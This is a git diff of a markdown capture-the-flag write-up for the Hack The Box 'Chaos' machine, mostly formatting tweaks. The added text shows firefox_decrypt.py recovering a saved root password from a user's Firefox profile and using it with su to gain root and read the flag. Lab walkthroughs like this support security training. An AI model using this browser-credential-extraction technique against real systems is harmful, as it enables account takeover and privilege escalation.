@@ -639,7 +639,7 @@ builtin                   dirs                      false                     ki
 
 <br />
 
-Searching in [GTFOBins](https://gtfobins.github.io/) I discover that we can break out the restricted shell:
+Searching in [GTFOBins](https://gtfobins.github.io/) I discover that we can `break out` the `restricted shell`:
 
 <br />
 
@@ -658,7 +658,7 @@ $ cat user.txt
 
 <br />
 
-Perfect!! We have the user.txt flag!!
+Perfect!! We have the user flag!!
 
 <br />
 
@@ -666,7 +666,7 @@ Perfect!! We have the user.txt flag!!
 
 <br />
 
-Afert a time enumerating the system, we find a .mozilla directory:
+Afert a time enumerating the `system`, we find a `.mozilla` directory:
 
 <br />
 
@@ -688,8 +688,40 @@ drwx------ 4 ayush ayush 4096 Jun 30  2022 .mozilla
 
 <br />
 
-Let's try to extract passwords from Firefox with the [firefox_decrypt.py](https://github.com/unode/firefox_decrypt):
+Let's try to extract `passwords` from `Firefox` with the [firefox_decrypt.py](https://github.com/unode/firefox_decrypt):
 
 <br />
 
+```bash
+$ python3 firefox_decrypt.py
 
+Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: 
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+```
+
+<br />
+
+We have a new password!!
+
+Try to log into the root user with it:
+
+<br />
+
+```bash
+$ su root
+Password: 
+root@chaos:/home/ayush# id
+uid=0(root) gid=0(root) groups=0(root)
+root@chaos:/home/ayush# cd
+root@chaos:~# cat root.txt
+2ffec600bf688ab9d4d516442abf1b7d
+```
+
+<br />
+
+# Beyond Root: Via Webmin 
+
+<br />
